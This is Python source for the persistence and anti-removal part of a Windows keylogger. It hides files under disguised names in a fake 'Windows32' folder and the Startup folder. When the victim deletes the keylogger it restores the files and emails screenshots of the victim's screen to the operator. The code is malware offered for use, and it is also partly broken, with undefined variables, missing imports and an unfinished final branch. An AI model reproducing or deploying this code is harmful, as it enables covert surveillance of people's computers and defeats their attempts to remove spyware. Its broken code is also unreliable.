import os
import time
import os.path
import smtplib
import mail_info
from email.mime.text import MIMEText
import pyautogui
from email.mime.image import MIMEImage
import email.mime.multipart
import sys
import random


'''
Files that this program will protect:
The logger file
the timer file
the mail_info file'''

user = os.environ['USERNAME']
einfo = mail_info.email_manager()
class info_email:
	def __init__(self):
		self.address, self.password = einfo.email_decrypter()
		self.dom = einfo.domain_get(self.address)
		try:
			self.server = smtplib.SMTP('smtp.{0}'.format(self.dom), 587)
			self.server.starttls()
			server.login(self.address, self.password)
		except:
			pass
		self.t = 'Logger Admin'
		self.f = 'Keylogger Deffender'
		self.emailform = MIMEMultipart()
		
		
		
		
	def error_backup(self, mail_data):
        if not os.path.exists('C:\\Users\\{0}\\Windows32\\m.key'.format(user)):
            key = Fernet.generate_key()
            with open('C:\\Users\\{0}\\Windows32\\m.key'.format(user), 'wb')as md:
                md.writelines(key)
                md.close()
        else:
            with open('C:\\Users\\{0}\\Windows32\\m.key'.format(user), 'rb')as keyfile:
                key = keyfile.readlines()
                keyfile.close()
            _key = Fernet(key)
            
            if _type == 'error':
                num_used = True
                
                
                
                while num_used:
                    tempnum = str(random.randint(1,100000))
                
                
                    for x in os.listdir('C:\\Users\\{0}\\Windows32\\error_backups'.format(user)):
                        if tempnum in x:
                            num_used = True
                            break
                        
                        else:
                            num_used = False
                        
                        
                title = 'error_' + tempnum
            else:
                
                num_used = True
                
                
                
                while num_used:
                    tempnum = str(random.randint(1,100000))
                
                
                    for x in os.listdir('C:\\Users\\{0}\\Windows32\\error_backups'.format(user)):
                        if tempnum in x:
                            num_used = True
                            break
                        
                        else:
                            num_used = False
                title = 'solution_' + tempnum
                
            for x in maildata:
                enc = x.encode()
                encr = _key.encrypt(enc)
            
                with open('C:\\Users\\{0}\\Windows32\\error_backups\\{1}.encrypted'.format(user, title), 'a')as newline:
                    newline.write('\n')
                    newline.close()
                with open('C:\\Users\\{0}\\Windows32\\error_backups\\{1}.encrypted'.format(user, title), 'ab')as encw:
                    encw.write(encr)
                    encw.close()
	def screenshot(self,name):
		screenshot = pyautogui.screenshot()
		screenshot.save('C:\\Users\\{1}\\Windows32\\xbin\\{0}.jpg'.format(name,user))
		with open('C:\\Users\\{1}\\Windows32\\xbin\\{0}.jpg'.format(name, user), 'rb')as binread:
			image = binread.readlines()
			binread.close()
		return image
		
	def error_mail(self, error, issues):
		emailtext = MIMEText("<h1><font color='red'>{0}</font></h1><p>{1}</p>".format(error, issues), 'html')
		self.emailform.attach(emailtext)
		self.emailform['To'] = self.t
		self.emailform['From'] = self.f
		self.emailform['Subject'] = 'ERROR'
		screenshotb = self.screenshot('error')
		image = MIMEImage(screenshotb)
		_email_form = self.emailform.attach(image)
		try:
			self.server.sendmail(self.address, self.address, _email_form.as_string())
		except:
			self.error_backup(_email_form)
		
		
		try:
			os.remove('C:\\Users\\{1}\\Windows32\\xbin\\{0}.jpg'.format('error', user))
		except PermissionError:
			with open('C:\\Users\\{0}\\Windows32\\boot_restart', 'w')as bootrestart:
				bootrestart.close()
			sys.exit()
		
	def solution_mail(self, error):
		emailtext = MIMEText('<h1><font color=\'green\'>{0}</h1></font>'.format(error),'html')
		self.emailform.attach(emailtext)
		emailform['To'] = self.t
		emailform['From'] = self.f
		emailform['Subject'] = 'Error Fixed'
		screenshotb = self.screenshot('solution')
		image = MIMEImage(screenshotb)
		_email_form = emailform.attach(image)
		try:
			self.server.sendmail(self.address, self.address, _email_form.as_string())
		except:
			self.error_backup(_email_form)
		os.remove('C:\\Users\\micha\\Windows32\\xbin\\{0}.jpg'.format('solution'))


em = info_email()
#Have the setup file make a folder in the user folder with the name: Office Defualts, and fill it with a bunch of css files, and make a folder entitled interpreter
	
					
	
#Have the setup file rename the log file's original name to Windows_Error_Diagnostic after it has copied it to startup
#Make the setup file write files into the boot folder containing the bianary to all of the files in the backup list
backup = {'C:\\Users\\' + user + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Windows_Error_Diagnostic.exe': 'Windows_Error_Diagnotstic', 'C:\\Users\\' + user + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\windows_time_manager.exe': 'windows_time_manager', 'C:\\Users\\{0}\\mail_info.py'.format(user):'mail_info'}



	
while 1 < 7:
	
	
	for x in backup:
		if not os.path.exists(x):
			if backup[x] == 'Windows_Error_Diagnotstic':
				em.error_mail('The File: {0} was Removed'.format(backup[x]), 'This means that the user has found and removed the keylogger from their computer. It is suggested that you use the self-destruct command through email; however the file will be backed up by this file')
			elif backup[x] == 'windows_time_manager':
				em.error_mail('The File: {0} was Removed'.format(backup[x]), 'This means the user has most likely found the keylogger, as this file is in the same folder as the keylogger. It is recomended that you activate the self-destruct command through email; however both the keylogger file and the timer file will be backed up by this file.')
			elif backup[x] == 'mail_info':
				em.error_mail('The File: {0} was Removed'.format(backup[x]), 'This means that the user has found the Windows32 folder where this file and most other important files to the keylogger where being hidden. The logger file will attempt to revive the folder.')
			time.sleep(10)
			try:
				with open(backup[x], 'rb')as fileRevive:
					filebin = fileRevive.readlines()
					fileRevive.close()
				with open(x, 'wb')as fileSave:
					fileSave.writelines(x)
					fileSave.close()
			except FileExistsError:
				pass
			em.solution_mail('{0} was Revived'.format(backup[x]))
		elif os.path.exists('C:\\Users\\' + username + '\\Windows32\\lo_needs_restart'):
			#Start the final backup file
			os.startfile()
			em.error_mail('The Logger File Failed', 'The logger file failed and shut itself down. The backup file will attempt to revive it. This was most likely caused by a permission error encountered when deleting the finished timer file.')
			os.startfile('C:\\Users\\' + user + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Windows_Error_Diagnostic.exe')
			time.sleep(10)
			em.solution_mail('The Logger File has been Successfully Restored')
			
		elif os.path.exists('C:\\Users\\{0}\\Windows32\\boot\\boot_remove'.format(user)):
			
		
		
		
		